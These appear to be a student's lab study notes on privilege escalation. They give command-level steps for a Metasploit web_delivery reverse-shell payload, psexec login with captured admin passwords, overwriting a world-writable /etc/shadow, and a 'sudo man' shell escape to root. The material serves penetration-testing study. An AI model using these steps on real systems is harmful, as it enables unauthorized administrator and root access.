# Privilege Escalation
## Windows Privilege Escalation
### Identifying Windows Privilege Escalation Vulnerabilities
**Pricesc check script**
1. msfconsole: `search  web_delivery` -> `exploit/multi/script/web_delivery` -> `use 1` -> set LHOST, set target PSH, set payload windows/shell/reverse_tcp -> set PSH-EncodedCommand false
2.  copy and run the command that is propmpted in the script on the target windows machine 


After getting inistial acces and have a meterpreter session
  1. meterpreter: `cd C:\\` -> `cd Users` -> `cd student` -> `cd Desktop`
  2. navigate to the PrivescCheck directory that we popyed over(might be in a temp folder)
  3. `shell`
  4. Documentation: https://github.com/itm4n/PrivescCheck 
  
### Windows Privelege Escalation
**psexec**
1. Attack machine: `psexec.py username@target.ip` -> enter optained admin password(from prev notes)
2. if meterpreter session: `search exploit/windows/smb/psexex_psh` -> set Options and run

## Linux privilege escalation
**Weak permissions**
We already have low priv access and we are on Target machine
1. Terminal(find files that can help us elevate our priveleges):`find / -not -type l -perm -o+w`, etc/shadow, `cat /etc/shadow` -> can we modify the etc/shadow file? `ls -al /etc/shadow`, if `-rw-rw-rw-` then yes
2. change password: `openssl passwd -1 -salt abc password`, you will get the hashed password back, then replace it in the shadow file
3. change /etc/shadow root password: `vim /etc/shadow`
 ![alt text](/assets/change_shadow_file.png)
4. `su` type password, and you are super user

**SUDO Priveleges**
We already have low priv access and we are on Target machine.
1. list of commands you user can run: `sudo -l`, example to look for: /usr/bin/man
2. The 'man' can be executed as root: `sudo man ls` -> `!/bin/bash`, then you are elevated